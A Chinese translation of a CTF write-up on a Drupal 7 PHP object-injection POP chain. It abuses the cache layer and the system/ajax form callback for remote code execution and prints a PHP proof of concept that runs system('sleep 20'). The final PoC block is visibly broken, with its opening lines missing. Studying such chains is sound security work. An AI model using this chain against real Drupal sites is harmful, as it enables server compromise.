@@ -1,0 +1,149 @@
+[原文链接](https://blog.ripstech.com/2019/complex-drupal-pop-chain/)
+## 前言
+在[Insomni’hack](https://insomnihack.ch/)主持的一场CTF比赛中有一道Drupal
+7对象注入的题目，本篇文章将介绍一下该题目的解法。
+## 利用前提
+出题人基于Drupal
+7.63搭建了一个网站，并想Drupal中添加了一个Cookie，包含一段PHP序列化字符串，提示这里存在一个反序列化漏洞入口。发现这个Tip非常简单，所以要想拿到Flag，关键在于寻找Drupal中的POP利用链。
+提示~要搞懂这篇文章里的知识点，还需要一些[PHP反序列化漏洞（PHP对象注入）知识基础](https://blog.ripstech.com/2018/php-object-injection/)。
+我们在Drupal源代码中发现了下文中的二阶POP链，该POP链影响了Drupal的缓存机制。通过该POP链可以将Payload注入到缓存中，起到和Drupalgeddon
+2一样的利用效果。
+此POP链包括以下两个步骤：
+  1. 将Payload注入到数据库缓存中，而此缓存会被渲染引擎使用。
+  2. 通过渲染引擎和Drupalgeddon 2完成漏洞利用。
+## 将Payload注入到数据库缓存
+在includes/bootstrap.inc中存在一个名为DrupalCacheArray的类，DrupalCacheArray类中实现了自己的destructor，并通过set()方法，将一些数据写到了数据库缓存中，也就产生了POP链的入口。
+    /**
+       * Destructs the DrupalCacheArray object.
+       */
+      public function __destruct() {
+        $data = array();
+        foreach ($this->keysToPersist as $offset => $persist) {
+          if ($persist) {
+            $data[$offset] = $this->storage[$offset];
+          }
+        }
+        if (!empty($data)) {
+          $this->set($data);
+        }
+      }
+这个set()方法底层调用了cache_set()方法，并传入了对象中的属性：$this->cid/$data/$this->bin，攻击者可以通过注入对象，控制这三个值。
+    protected function set($data, $lock = TRUE) {
+        // Lock cache writes to help avoid stampedes.
+        // To implement locking for cache misses, override __construct().
+        $lock_name = $this->cid . ':' . $this->bin;
+        if (!$lock || lock_acquire($lock_name)) {
+          if ($cached = cache_get($this->cid, $this->bin)) {
+            $data = $cached->data + $data;
+          }
+          cache_set($this->cid, $data, $this->bin);
+          if ($lock) {
+            lock_release($lock_name);
+          }
+        }
+      }
+cache_set()和Drupal缓存之间到底是什么关系呢？我们可以通过观察Drupal缓存的结构来回答这个问题。  
+通过观察Drupal缓存的内部结构，我们可以发现缓存的数据被保存在了数据库中，每种缓存类型都有单独的数据表。（例如表单缓存、页面缓存）
+    MariaDB [drupal7]> SHOW TABLES;
+    +-----------------------------+
+    | Tables_in_drupal7           |
+    +-----------------------------+
+    ...
+    | cache                       |
+    | cache_block                 |
+    | cache_bootstrap             |
+    | cache_field                 |
+    | cache_filter                |
+    | cache_form                  |
+    | cache_image                 |
+    | cache_menu                  |
+    | cache_page                  |
+    | cache_path                  |
+    ...
+通过代码逻辑，我们可以得知，数据库中的表名对应的是$this->bin的值。因此，我们可以将数据注入到任意缓存表中。  
+接下来查看一下缓存表的数据结构：
+    MariaDB [drupal7]> DESC cache_form;
+    +------------+--------------+------+-----+---------+-------+
+    | Field      | Type         | Null | Key | Default | Extra |
+    +------------+--------------+------+-----+---------+-------+
+    | cid        | varchar(255) | NO   | PRI |         |       |
+    | data       | longblob     | YES  |     | NULL    |       |
+    | expire     | int(11)      | NO   | MUL | 0       |       |
+    | created    | int(11)      | NO   |     | 0       |       |
+    | serialized | smallint(6)  | NO   |     | 0       |       |
+    +------------+--------------+------+-----+---------+-------+
+存在一个名为cid的列，以及一个名为data的列，猜测cid为$this->cid的值，data为$data的值，是攻击者可以控制的。
+口说无凭，瞎猜误事儿。下面我们通过一个小测试来验证猜想，在本地创建一个类，构造序列化字符串：
+    class SchemaCache {
+        // Insert an entry with some cache_key
+        protected $cid = "some_cache_key";
+        // Insert it into the cache_form table
+        protected $bin = "cache_form";
+        protected $keysToPersist = array('input_data' => true);
+        protected $storage = array('input_data' => array("arbitrary data!"));
+    }
+    $schema = new SchemaCache();
+    echo serialize($schema);
+我们使用SchemaCache类，由于SchemaCache类继承了抽象类DrupalCacheArray，所以他不会自动实例化，这样就不会导致一些意外情况干扰实验。按照我们的猜想，注入此向量，将创建一个名为cache_form的数据表，并通过$this->cid、$data将数据带入。
+    MariaDB [drupal7]> SELECT * FROM cache_form;
+    +----------------+-----------------------------------------------------------+--------+------------+------------+
+    | cid            | data                                                      | expire | created    | serialized |
+    +----------------+-----------------------------------------------------------+--------+------------+------------+
+    | some_cache_key | a:1:{s:10:"input_data";a:1:{i:0;s:15:"arbitrary data!";}} |      0 | 1548684864 |          1 |
+    +----------------+-----------------------------------------------------------+--------+------------+------------+
+这说明我们的猜想是OK的~
+## 通过数据库缓存实现远程命令执行
+现在我们能将任意数据写入到任意缓存表中，接下来要做的，就是观察Drupal缓存的使用点，寻找可以命令执行的功能点。  
+对使用点挨个审计的过程中，发现了一处Ajax回调，可以通过`http://drupalurl.org/?q=system/ajax`触发以下函数：
+    function ajax_form_callback() {
+      list($form, $form_state, $form_id, $form_build_id, $commands) = ajax_get_form();
+      drupal_process_form($form['#form_id'], $form, $form_state);
+    }
+ajax_form_callback()方法使用了cache_get()，从cache_form表中获取数据。
+    if ($cached = cache_get('form_' . $form_build_id, 'cache_form')) {
+        $form = $cached->data;
+      ...
+      return $form;
+     }
+根据Drupal的渲染机制，这很可能意味着我们可以将缓存表中的可控数据，传递给drupal_process_form()方法，从而实现任意代码执行。就像之前提到的
+[Drupalgeddon 2](https://research.checkpoint.com/uncovering-drupalgeddon-2/)利用链就是利用了这一特性。  
+在drupal_process_form()中，我们发现了以下代码：
+    if (isset($element['#process']) && !$element['#processed']) {
+        foreach ($element['#process'] as $process) {
+          $element = $process($element, $form_state, $form_state['complete form']);
+        }
+$element是通过cache_get()方法获取的缓存表中的数据数组，通过上文，可知该数组的key和value是可控的。所以，我们可以通过设置$process的值，来回调任意函数，并使用数组给回调函数提供参数。  
+由于第一个参数是数组，所以不可能简单地直接调用system()函数。我们需要找一个第一参数为数组，并能最终实现RCE的函数。  
+搜寻一番，就能发现，drupal_process_attached()满足我们的需要：
+    function drupal_process_attached($elements, $group = JS_DEFAULT, $dependency_check = FALSE, $every_page = NULL) {
+    ...
+      foreach ($elements['#attached'] as $callback => $options) {
+        if (function_exists($callback)) {
+          foreach ($elements['#attached'][$callback] as $args) {
+            call_user_func_array($callback, $args);
+          }
+        }
+      }
+      return $success;
+代码中的任意变量都可控，因此可以通过call_user_func_array()实现RCE。  
+最终的POP链如下：
+     true,
+            '#process' => true,
+            '#attached' => true
+        );
+        protected $storage = array(
+                '#form_id' => 1337,
+                '#process' => array('drupal_process_attached'),
+                '#attached' => array(
+                    'system' => array(array('sleep 20'))
+                )
+        );
+    }
+    $schema = new SchemaCache();
+    echo serialize($schema);
+接下来要做的，就是通过反序列化入口（题目中刻意构造的Cookie入口）将POC产生的序列化数据注入到Drupal缓存中，然后发送POST请求`http://drupalurl.org/?q=system/ajax`，并将POST参数`form_build_id`设置为`1337`从而触发RCE。
+## 总结
+POP利用链通常比较复杂，需要对程序的功能结构以及PHP语法特性很熟悉。这篇文章的目的是证明即使没有明显的一阶POP链，仍然可以尝试利用。我们在寻找POP链时，知道Drupal的渲染API在过去使用了很多回调写法，更容易实现利用，所以才朝着这个方向努力，最终找到了这个POP链。当然，对PHP语法特性的精准掌握也能让我们更容易找到新的利用链。  
+这里还有另一个[POP链](https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4)，通过反序列化漏洞到XXE盲打再到任意文件读取再到SQL注入最后实现RCE，由Paul
+Axe提供。  
+再次感谢高质量的Insomni’hack CTF 2019比赛。
